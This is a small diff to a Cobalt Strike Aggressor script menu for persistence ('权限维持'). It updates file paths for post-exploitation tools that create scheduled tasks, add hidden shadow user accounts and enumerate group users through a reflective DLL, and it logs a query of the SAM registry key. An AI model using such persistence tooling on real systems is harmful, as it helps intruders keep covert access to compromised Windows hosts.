@@ -11,7 +11,7 @@ menu "☆ 权限维持"{
 
     sub SharpSchTask{
         $arg = join(' ', @($3['exec']));
-        bexecute_assembly!($bid, script_resource("/scripts/AuthMaintainSchTask.exe"), $arg);
+        bexecute_assembly!($bid, script_resource("/scripts/AuthMaintain/SchTask.exe"), $arg);
     }
     item "SharpShadowUser" {
         blog($1, "\c9=========== SharpShadowUser ==========");
@@ -25,7 +25,7 @@ menu "☆ 权限维持"{
 
     sub SharpShadowUser{
         $arg = join(' ', @($3['exec']));
-        bexecute_assembly!($bid, script_resource("/scripts/AuthMaintainShadowUser.exe"), $arg);
+        bexecute_assembly!($bid, script_resource("/scripts/AuthMaintain/ShadowUser.exe"), $arg);
     }
 	
 	menu "EasyPersistent" {
@@ -315,7 +315,7 @@ menu "☆ 权限维持"{
 								$bid = $3['bid'];
 								$Parameter = "GetGroupUsers"."|1|1|".$3['localgroups']."|1";
 								blog($bid,"$Parameter");
-								bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "GetGroupUsers", 5000);	
+								bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "GetGroupUsers", 5000);	
 							}
 							if($3['addtype'] eq "REG" ){
 								blog($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
@@ -336,7 +336,7 @@ menu "☆ 权限维持"{
 
 								$Parameter = "QueryUserInfo"."|".$User."|1|1|1";
 								blog($bid,"$Parameter");
-								bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "QueryUserInfo", 5000);	
+								bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "QueryUserInfo", 5000);	
 								
 							}
 							if($3['addtype'] eq "REG" ){
